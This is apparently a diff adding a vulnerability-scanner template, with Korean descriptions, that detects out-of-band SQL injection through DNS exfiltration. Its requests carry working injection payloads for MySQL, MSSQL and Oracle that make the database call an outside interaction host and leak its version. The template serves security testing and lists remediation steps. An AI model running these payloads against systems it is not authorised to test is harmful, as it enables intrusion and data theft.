@@ -1,0 +1,60 @@
+id: sqli-out-of-band-dns
+
+info:
+  name: Out-of-Band SQL Injection via DNS Exfiltration
+  author: security-researcher
+  severity: critical
+  description: |
+    DNS 채널을 이용한 Out-of-Band SQL 인젝션을 탐지합니다.
+    LOAD_FILE, UTL_HTTP, xp_cmdshell 등을 이용한 DNS 요청을 통해
+    데이터베이스 정보를 외부로 유출할 수 있습니다.
+  tags: sqli,oob,dns,blind,injection,data-exfiltration
+  remediation: |
+    - Prepared Statement 사용
+    - 데이터베이스 서버의 외부 네트워크 접근 차단
+    - MySQL: secure_file_priv 설정
+    - MSSQL: xp_cmdshell 비활성화
+    - Oracle: UTL_HTTP, UTL_FILE 권한 제거
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}?id=1"
+
+    # Interactsh를 이용한 OOB 탐지 (실제 사용 시 {{interactsh-url}} 활용)
+    payloads:
+      oob_domain:
+        - "oob-test.{{interactsh-url}}"
+
+    # MySQL LOAD_FILE DNS
+    headers:
+      X-Custom-Test: "1"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+  - method: GET
+    path:
+      # MySQL
+      - "{{BaseURL}}?id=1 AND LOAD_FILE(concat('\\\\\\\\',version(),'.{{interactsh-url}}\\\\test'))"
+      # MSSQL
+      - "{{BaseURL}}?id=1; EXEC master..xp_dirtree '\\\\{{interactsh-url}}\\test'--"
+      # Oracle
+      - "{{BaseURL}}?id=1 AND 1=UTL_HTTP.REQUEST('http://{{interactsh-url}}')"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+    extractors:
+      - type: kval
+        part: interactsh_request
+        kval:
+          - "host"
